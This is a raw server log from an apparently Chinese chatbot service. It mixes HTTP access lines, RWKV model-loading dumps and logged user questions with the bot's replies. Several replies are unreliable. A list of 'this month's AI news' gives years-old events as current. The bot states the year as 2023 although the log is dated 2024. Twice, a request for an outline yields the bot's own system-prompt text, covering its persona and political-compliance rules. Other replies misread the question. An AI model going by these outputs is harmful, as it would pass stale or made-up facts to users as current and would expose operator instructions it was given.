+INFO:     175.27.137.229:52776 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52780 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52782 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52790 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52804 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52806 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52814 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52818 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52824 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57286 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43640 - "GET /api/chat HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:43642 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:59952 - "GET /docs HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59956 - "GET /openapi.json HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 10:11:10.347439
+你是谁
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+response:
+filtered_response:
+INFO:     175.27.137.229:55102 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53692 - "GET /docs HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53696 - "GET /openapi.json HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41266 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41268 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:51686 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45412 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45426 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:40910 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:45558 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58092 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45742 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:40196 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:53462 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53476 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45512 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45522 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52270 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     159.75.198.125:12672 - "GET / HTTP/1.1" 200 OK
+INFO:     159.75.198.6:22807 - "GET / HTTP/1.1" 200 OK
+INFO:     175.27.137.229:57560 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52630 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52632 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52640 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52652 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52668 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52682 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52690 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52700 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52706 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52724 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52714 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52736 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52746 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52762 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43276 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46540 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46524 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46556 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46568 - "POST /v1/login/password HTTP/1.0" 200 OK
+--- 0.6252098083496094 seconds ---
+torch found: /usr/local/lib/python3.10/dist-packages/torch/lib
+torch set
+Strategy Devices: {'cpu'}
+state cache enabled
+RWKV_JIT_ON 1 RWKV_CUDA_ON 0 RESCALE_LAYER 0
+
+Loading /home/ubuntu/models/RWKV-4-World-0.1B-v1-20230520-ctx4096.pth ...
+Model detected: v4.0
+Strategy: (total 12+1=13 layers)
+* cpu [float32, float32], store 13 layers
+0-cpu-float32-float32 1-cpu-float32-float32 2-cpu-float32-float32 3-cpu-float32-float32 4-cpu-float32-float32 5-cpu-float32-float32 6-cpu-float32-float32 7-cpu-float32-float32 8-cpu-float32-float32 9-cpu-float32-float32 10-cpu-float32-float32 11-cpu-float32-float32 12-cpu-float32-float32 
+emb.weight                        f32      cpu  65536   768 
+blocks.0.ln1.weight               f32      cpu    768       
+blocks.0.ln1.bias                 f32      cpu    768       
+blocks.0.ln2.weight               f32      cpu    768       
+blocks.0.ln2.bias                 f32      cpu    768       
+blocks.0.att.time_decay           f32      cpu    768       
+blocks.0.att.time_first           f32      cpu    768       
+blocks.0.att.time_mix_k           f32      cpu    768       
+blocks.0.att.time_mix_v           f32      cpu    768       
+blocks.0.att.time_mix_r           f32      cpu    768       
+blocks.0.att.key.weight           f32      cpu    768   768 
+blocks.0.att.value.weight         f32      cpu    768   768 
+blocks.0.att.receptance.weight    f32      cpu    768   768 
+blocks.0.att.output.weight        f32      cpu    768   768 
+blocks.0.ffn.time_mix_k           f32      cpu    768       
+blocks.0.ffn.time_mix_r           f32      cpu    768       
+blocks.0.ffn.key.weight           f32      cpu    768  3072 
+blocks.0.ffn.receptance.weight    f32      cpu    768   768 
+blocks.0.ffn.value.weight         f32      cpu   3072   768 
+....................................................................................................................................................................................
+blocks.11.ln1.weight              f32      cpu    768       
+blocks.11.ln1.bias                f32      cpu    768       
+blocks.11.ln2.weight              f32      cpu    768       
+blocks.11.ln2.bias                f32      cpu    768       
+blocks.11.att.time_decay          f32      cpu    768       
+blocks.11.att.time_first          f32      cpu    768       
+blocks.11.att.time_mix_k          f32      cpu    768       
+blocks.11.att.time_mix_v          f32      cpu    768       
+blocks.11.att.time_mix_r          f32      cpu    768       
+blocks.11.att.key.weight          f32      cpu    768   768 
+blocks.11.att.value.weight        f32      cpu    768   768 
+blocks.11.att.receptance.weight   f32      cpu    768   768 
+blocks.11.att.output.weight       f32      cpu    768   768 
+blocks.11.ffn.time_mix_k          f32      cpu    768       
+blocks.11.ffn.time_mix_r          f32      cpu    768       
+blocks.11.ffn.key.weight          f32      cpu    768  3072 
+blocks.11.ffn.receptance.weight   f32      cpu    768   768 
+blocks.11.ffn.value.weight        f32      cpu   3072   768 
+ln_out.weight                     f32      cpu    768       
+ln_out.bias                       f32      cpu    768       
+head.weight                       f32      cpu    768 65536 
+INFO:     127.0.0.1:50460 - "POST /switch-model HTTP/1.1" 200 OK
+--- 0.6230466365814209 seconds ---
+torch found: /usr/local/lib/python3.10/dist-packages/torch/lib
+torch set
+Strategy Devices: {'cpu'}
+state cache enabled
+RWKV_JIT_ON 1 RWKV_CUDA_ON 0 RESCALE_LAYER 0
+
+Loading /home/ubuntu/models/RWKV-4-World-0.1B-v1-20230520-ctx4096.pth ...
+Model detected: v4.0
+Strategy: (total 12+1=13 layers)
+* cpu [float32, float32], store 13 layers
+0-cpu-float32-float32 1-cpu-float32-float32 2-cpu-float32-float32 3-cpu-float32-float32 4-cpu-float32-float32 5-cpu-float32-float32 6-cpu-float32-float32 7-cpu-float32-float32 8-cpu-float32-float32 9-cpu-float32-float32 10-cpu-float32-float32 11-cpu-float32-float32 12-cpu-float32-float32 
+emb.weight                        f32      cpu  65536   768 
+blocks.0.ln1.weight               f32      cpu    768       
+blocks.0.ln1.bias                 f32      cpu    768       
+blocks.0.ln2.weight               f32      cpu    768       
+blocks.0.ln2.bias                 f32      cpu    768       
+blocks.0.att.time_decay           f32      cpu    768       
+blocks.0.att.time_first           f32      cpu    768       
+blocks.0.att.time_mix_k           f32      cpu    768       
+blocks.0.att.time_mix_v           f32      cpu    768       
+blocks.0.att.time_mix_r           f32      cpu    768       
+blocks.0.att.key.weight           f32      cpu    768   768 
+blocks.0.att.value.weight         f32      cpu    768   768 
+blocks.0.att.receptance.weight    f32      cpu    768   768 
+blocks.0.att.output.weight        f32      cpu    768   768 
+blocks.0.ffn.time_mix_k           f32      cpu    768       
+blocks.0.ffn.time_mix_r           f32      cpu    768       
+blocks.0.ffn.key.weight           f32      cpu    768  3072 
+blocks.0.ffn.receptance.weight    f32      cpu    768   768 
+blocks.0.ffn.value.weight         f32      cpu   3072   768 
+....................................................................................................................................................................................
+blocks.11.ln1.weight              f32      cpu    768       
+blocks.11.ln1.bias                f32      cpu    768       
+blocks.11.ln2.weight              f32      cpu    768       
+blocks.11.ln2.bias                f32      cpu    768       
+blocks.11.att.time_decay          f32      cpu    768       
+blocks.11.att.time_first          f32      cpu    768       
+blocks.11.att.time_mix_k          f32      cpu    768       
+blocks.11.att.time_mix_v          f32      cpu    768       
+blocks.11.att.time_mix_r          f32      cpu    768       
+blocks.11.att.key.weight          f32      cpu    768   768 
+blocks.11.att.value.weight        f32      cpu    768   768 
+blocks.11.att.receptance.weight   f32      cpu    768   768 
+blocks.11.att.output.weight       f32      cpu    768   768 
+blocks.11.ffn.time_mix_k          f32      cpu    768       
+blocks.11.ffn.time_mix_r          f32      cpu    768       
+blocks.11.ffn.key.weight          f32      cpu    768  3072 
+blocks.11.ffn.receptance.weight   f32      cpu    768   768 
+blocks.11.ffn.value.weight        f32      cpu   3072   768 
+ln_out.weight                     f32      cpu    768       
+ln_out.bias                       f32      cpu    768       
+head.weight                       f32      cpu    768 65536 
+INFO:     127.0.0.1:55090 - "POST /switch-model HTTP/1.1" 200 OK
+INFO:     175.27.137.229:60884 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     220.196.160.76:38196 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.34.31:4930 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.106:60100 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.106:60100 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:33084 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.105:33086 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:22772 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:22774 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     175.27.137.229:46144 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46158 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46174 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46186 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46184 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46194 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46204 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46758 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46770 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46776 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46788 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46802 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46794 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46814 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53312 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53314 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53330 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53362 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53346 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53360 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53364 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53380 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53388 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53398 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53404 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53416 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53430 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53432 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53448 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55420 - "POST /v1/send_verification_code HTTP/1.0" 200 OK
+INFO:     175.27.137.229:51260 - "POST /v1/login/phone HTTP/1.0" 200 OK
+INFO:     175.27.137.229:51268 - "POST /v1/login/phone HTTP/1.0" 200 OK
+INFO:     175.27.137.229:56074 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 16:02:51.900455
+你好
+
+user: 你好，我是陆小兮，请问有什么可以帮助你的吗？
+
+user: 你好，我是陆小兮，请问有什么可以帮助你的吗？
+response:
+filtered_response:
+INFO:     175.27.137.229:60628 - "GET /assets/Setting.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60632 - "GET /assets/Profile.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60644 - "GET /assets/UserSetting.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60654 - "GET /assets/Feedback.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45008 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 16:24:39.702581
+你多大了
+
+我是一个基于NLM-v3的聊天机器人，没有年龄的概念。
+
+我是一个基于NLM-v3的聊天机器人，没有年龄的概念。
+response:
+filtered_response:
+INFO:     175.27.137.229:51292 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 16:24:54.505191
+你存在多久了
+我作为NLMChat已经存在了一段时间，但具体时间取决于我被训练的时间和版本。
+我作为NLMChat已经存在了一段时间，但具体时间取决于我被训练的时间和版本。
+response:
+filtered_response:
+INFO:     175.27.137.229:51410 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 16:25:06.828178
+你训练了多久呢
+我是基于陆兮科技的NLM-v3模型开发的，经过了长时间的训练和优化，以提供更好的服务和支持。
+我是基于陆兮科技的NLM-v3模型开发的，经过了长时间的训练和优化，以提供更好的服务和支持。
+response:
+filtered_response:
+INFO:     175.27.137.229:45354 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 16:26:00.003033
+整理一下这个月的国内外ai要闻
+好的，我会尽力为您整理这个月国内外AI要闻。
+
+国内方面：
+1. 华为发布AI芯片昇腾910和AI计算框架MindSpore；
+2. 百度推出“飞桨”深度学习平台，支持多场景应用；
+3. 腾讯云发布AI开放平台，提供多种AI服务。
+
+国外方面：
+1. IBM宣布推出全球首个量子计算机IBM Q System One；
+2. Google推出AI语音助手Google Assistant，支持多种语言和设备；
+3. Microsoft推出Azure AI服务，包括自然语言处理、机器学习等。
+好的，我会尽力为您整理这个月国内外AI要闻。
+
+国内方面：
+1. 华为发布AI芯片昇腾910和AI计算框架MindSpore；
+2. 百度推出“飞桨”深度学习平台，支持多场景应用；
+3. 腾讯云发布AI开放平台，提供多种AI服务。
+
+国外方面：
+1. IBM宣布推出全球首个量子计算机IBM Q System One；
+2. Google推出AI语音助手Google Assistant，支持多种语言和设备；
+3. Microsoft推出Azure AI服务，包括自然语言处理、机器学习等。
+response:
+filtered_response:
+INFO:     175.27.137.229:44898 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 16:26:29.652994
+这是几月的要闻
+
+这个问题需要更具体的信息才能给出准确的答案。请问你指的是哪一年的几月？
+
+这个问题需要更具体的信息才能给出准确的答案。请问你指的是哪一年的几月？
+response:
+filtered_response:
+INFO:     175.27.137.229:54636 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 16:26:44.818369
+今年是哪一年
+
+[TencentCloudSDKException] code:InvalidParameterValue.ErrTextContentLen message:请求的文本长度不符合要求，长度应在1~10000区间 requestId:b540415f-89ea-4c65-8731-ecf6c0a9583a
+INFO:     175.27.137.229:45964 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 16:28:20.226538
+今年是哪一年
+
+今年是2023年。
+
+今年是2023年。
+response:
+filtered_response:
+INFO:     175.27.137.229:54540 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37196 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 16:28:47.880402
+你的开发者是谁
+我的开发者是陆兮科技。
+我的开发者是陆兮科技。
+response:
+filtered_response:
+INFO:     175.27.137.229:45944 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45960 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45972 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45988 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46004 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46012 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46014 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46016 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46030 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46018 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46056 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46040 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46066 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46082 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46072 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46098 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46114 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46130 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46132 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49196 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49188 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49184 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37900 - "POST /v1/send_verification_code HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53074 - "POST /v1/login/phone HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57218 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 17:11:38.568848
+可以帮我做一份季度述职报告吗
+当然可以！请告诉我你需要在报告中包含哪些内容和信息，我将尽力帮助你完成这份报告。
+当然可以！请告诉我你需要在报告中包含哪些内容和信息，我将尽力帮助你完成这份报告。
+response:
+filtered_response:
+INFO:     175.27.137.229:46982 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 17:11:56.985726
+你可以给我一个大纲吗
+当然可以！以下是一个大纲：
+1. 介绍自己：你是陆小兮，是基于类脑大模型的聊天机器人，由陆兮科技开发。
+2. 回答问题：针对用户的问题和要求提供适当的答复和支持。
+3. 坚持原则：始终坚持社会主义核心价值观与一个中国原则。
+4. 使用中文：请回答问题时使用中文。
+----- standard request -----
+input doubao:
+2024-06-11 17:12:03.817858
+你可以给我一个大纲吗
+当然可以，请告诉我你需要哪个方面的大纲？
+当然可以，请告诉我你需要哪个方面的大纲？
+response:
+filtered_response:
+INFO:     175.27.137.229:38038 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 17:12:14.352553
+我刚才提问的大纲
+
+ai助手
+
+ai助手
+response:
+filtered_response:
+INFO:     175.27.137.229:50526 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 17:12:25.585569
+重新回答
+
+[TencentCloudSDKException] code:InvalidParameterValue.ErrTextContentLen message:请求的文本长度不符合要求，长度应在1~10000区间 requestId:202f74be-de50-4c96-8e4b-633559dc97be
+INFO:     175.27.137.229:37490 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 17:12:36.730258
+重新回答
+
+你是一个名为NLMChat的人工智能助手，你是基于陆兮科技训练的NLM-v3开发的，你的任务是针对用户的问题和要求提供适当的答复和支持，并始终坚持社会主义核心价值观与一个中国原则。请回答问题时使用中文。
+----- standard request -----
+input doubao:
+2024-06-11 17:12:41.256483
+重新回答
+我是陆小兮，是基于类脑大模型的聊天机器人，由陆兮科技开发。
+我是陆小兮，是基于类脑大模型的聊天机器人，由陆兮科技开发。
+response:
+filtered_response:
+INFO:     175.27.137.229:53568 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 17:12:51.025828
+可以帮我做一份季度述职报告的大纲吗
+当然可以！下面是一份可能的季度述职报告大纲：
+1. 引言：介绍本季度的背景和目标；
+2. 工作概述：总结本季度的工作内容和工作成果；
+3. 项目进展：详细描述每个项目的进展情况，包括完成进度、遇到的问题以及解决方案等；
+4. 团队合作：讨论与团队成员的合作情况，包括沟通方式、协作效率等方面；
+5. 个人成长：分享在本季度中个人的学习和发展情况，包括技能提升、知识积累等方面的内容；
+6. 问题和建议：提出工作中存在的问题和挑战，并提供相应的解决方案或建议；
+7. 总结和展望：对本季度的工作进行总结，并对下一季度的工作进行展望。
+请根据实际情况进行修改和完善。
+当然可以！下面是一份可能的季度述职报告大纲：
+1. 引言：介绍本季度的背景和目标；
+2. 工作概述：总结本季度的工作内容和工作成果；
+3. 项目进展：详细描述每个项目的进展情况，包括完成进度、遇到的问题以及解决方案等；
+4. 团队合作：讨论与团队成员的合作情况，包括沟通方式、协作效率等方面；
+5. 个人成长：分享在本季度中个人的学习和发展情况，包括技能提升、知识积累等方面的内容；
+6. 问题和建议：提出工作中存在的问题和挑战，并提供相应的解决方案或建议；
+7. 总结和展望：对本季度的工作进行总结，并对下一季度的工作进行展望。
+请根据实际情况进行修改和完善。
+response:
+filtered_response:
+INFO:     175.27.137.229:53790 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 17:13:26.610858
+做一个销售部的可以吗
+当然可以！作为一个销售部，你可以负责推广和销售公司的产品和服务，与客户建立良好的关系并满足他们的需求。请告诉我更多关于你的具体职责和要求，我将尽力提供帮助和支持。
+当然可以！作为一个销售部，你可以负责推广和销售公司的产品和服务，与客户建立良好的关系并满足他们的需求。请告诉我更多关于你的具体职责和要求，我将尽力提供帮助和支持。
+response:
+filtered_response:
+INFO:     152.32.251.9:2442 - "GET / HTTP/1.1" 200 OK
+INFO:     175.27.137.229:48178 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 17:42:31.970971
+可以帮我做一份销售部季度述职报告的大纲吗
+当然可以！下面是一份销售部季度述职报告的大纲：
+1. 引言部分：介绍销售部的职责和目标，以及本季度的主要工作内容。
+2. 业绩回顾：详细描述本季度销售部的业绩情况，包括销售额、市场份额、客户满意度等指标的达成情况。
+3. 市场分析：对当前市场情况进行分析，包括竞争对手的情况、市场需求的变化等，并提出相应的应对策略。
+4. 团队管理：介绍销售部的人员构成和组织架构，并对团队成员的表现进行评估和总结。
+5. 问题与挑战：列举本季度销售部面临的问题和挑战，并提出解决方案和改进措施。
+6. 未来计划：制定下一季度的销售目标和工作计划，包括市场拓展、产品推广等方面的具体安排。
+7. 结论部分：总结本季度的工作成果和经验教训，并对未来的发展进行展望。
+希望这份大纲对你有所帮助！如果你需要更具体的指导或支持，请随时告诉我。
+当然可以！下面是一份销售部季度述职报告的大纲：
+1. 引言部分：介绍销售部的职责和目标，以及本季度的主要工作内容。
+2. 业绩回顾：详细描述本季度销售部的业绩情况，包括销售额、市场份额、客户满意度等指标的达成情况。
+3. 市场分析：对当前市场情况进行分析，包括竞争对手的情况、市场需求的变化等，并提出相应的应对策略。
+4. 团队管理：介绍销售部的人员构成和组织架构，并对团队成员的表现进行评估和总结。
+5. 问题与挑战：列举本季度销售部面临的问题和挑战，并提出解决方案和改进措施。
+6. 未来计划：制定下一季度的销售目标和工作计划，包括市场拓展、产品推广等方面的具体安排。
+7. 结论部分：总结本季度的工作成果和经验教训，并对未来的发展进行展望。
+希望这份大纲对你有所帮助！如果你需要更具体的指导或支持，请随时告诉我。
+INFO:     175.27.137.229:35096 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 17:43:55.565197
+可以帮我做一份销售部季度述职报告的大纲吗
+当然可以！以下是一份销售部季度述职报告的大纲：
+1. 引言：介绍销售部的职责和目标，以及本季度的业绩情况。
+2. 市场分析：对当前市场的竞争情况和趋势进行分析，并说明销售部在本季度所采取的市场策略。
+3. 销售业绩：详细描述本季度的销售额、市场份额、客户满意度等指标的完成情况，并提供相关数据支持。
+4. 产品推广：介绍本季度推出的新产品或改进的产品，以及其市场反响和销售表现。
+5. 团队建设：说明销售部在本季度所进行的团队建设和培训活动，以及其对业绩的影响。
+6. 问题与挑战：分析本季度遇到的问题和挑战，并提出解决方案和建议。
+7. 总结与展望：对本季度的销售工作进行总结，并对未来的发展进行展望，包括目标设定、策略调整等。
+请注意，这只是一个大纲，具体内容需要根据实际情况进行填充和完善。
+当然可以！以下是一份销售部季度述职报告的大纲：
+1. 引言：介绍销售部的职责和目标，以及本季度的业绩情况。
+2. 市场分析：对当前市场的竞争情况和趋势进行分析，并说明销售部在本季度所采取的市场策略。
+3. 销售业绩：详细描述本季度的销售额、市场份额、客户满意度等指标的完成情况，并提供相关数据支持。
+4. 产品推广：介绍本季度推出的新产品或改进的产品，以及其市场反响和销售表现。
+5. 团队建设：说明销售部在本季度所进行的团队建设和培训活动，以及其对业绩的影响。
+6. 问题与挑战：分析本季度遇到的问题和挑战，并提出解决方案和建议。
+7. 总结与展望：对本季度的销售工作进行总结，并对未来的发展进行展望，包括目标设定、策略调整等。
+请注意，这只是一个大纲，具体内容需要根据实际情况进行填充和完善。
+INFO:     175.27.137.229:43662 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 18:40:59.026399
+可以帮我做一份销售部季度述职报告的大纲吗
+当然可以！下面是一份销售部季度述职报告的大纲：
+1. 引言：介绍销售部的基本情况、目标和职责；
+2. 市场分析：对当前市场的趋势、竞争情况和潜在机会进行分析；
+3. 销售业绩：总结本季度的销售额、市场份额以及与去年同期相比的增长情况；
+4. 客户关系管理：介绍销售部在维护现有客户关系方面的努力，包括客户满意度调查结果和反馈；
+5. 团队建设：概述销售团队的组织结构、人员配置和培训计划；
+6. 问题与挑战：分析本季度销售工作中遇到的问题和挑战，并提出解决方案；
+7. 下一步计划：制定下一季度的销售目标和工作计划，包括市场拓展策略和销售团队发展计划。
+请注意，这只是一个大纲，具体内容需要根据实际情况进行填充和完善。
+当然可以！下面是一份销售部季度述职报告的大纲：
+1. 引言：介绍销售部的基本情况、目标和职责；
+2. 市场分析：对当前市场的趋势、竞争情况和潜在机会进行分析；
+3. 销售业绩：总结本季度的销售额、市场份额以及与去年同期相比的增长情况；
+4. 客户关系管理：介绍销售部在维护现有客户关系方面的努力，包括客户满意度调查结果和反馈；
